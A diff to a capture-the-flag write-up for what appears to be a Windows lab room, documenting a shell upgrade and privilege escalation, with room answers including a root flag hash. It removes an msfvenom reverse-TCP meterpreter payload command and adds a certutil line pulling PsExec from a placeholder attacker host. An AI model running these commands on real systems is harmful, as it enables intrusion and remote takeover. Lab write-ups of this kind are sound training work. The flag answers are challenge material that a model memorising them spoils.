@@ -33,9 +33,16 @@ So I was able to get the flag: <br />
 
 
 ### Switching Shells
-Now we want to upgrade the shell to a meterpreter shell using the following command `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o shell-name.exe`.
-- What is the final size of the exe payload that you generated?
+- What is the final size of the exe payload that you generated?<br />
+![image](https://github.com/user-attachments/assets/26d92c39-71f5-47dc-bde1-18e51cf5a21c)<br />
+`73802`<br />
+I didn't really updated to a meterpreter shell, that should not be a problem. 
 
 ### Privilege Escalation
-- Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?
-- Read the root.txt file located at C:\Windows\System32\config
+Run `whoami /priv` to find out which privileges are enabled for my user: <br />
+![image](https://github.com/user-attachments/assets/24016b3e-28c3-4b34-a3f8-d01b9100e879)<br />
+We have the `SeImpersonatePrivilege`. After some reaserch I found out that this can be exploited using the `PsExec.exe` from the sysinternal utilities. So first i downloaded the .exe on my machine, and then transfered it on the windows reverse shell using the command `certutil -urlcache -split -f http://YOUR_IP:8000/PsExec.exe C:\Windows\Temp\PsExec.exe`. Now we can run `PsExec.exe` to locate the root flag.<br />
+
+- Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command? `NT AUTHORITY\SYSTEM`
+- Read the root.txt file located at C:\Windows\System32\config `dff0f748678f280250f25a45b8046b4a `
+ 
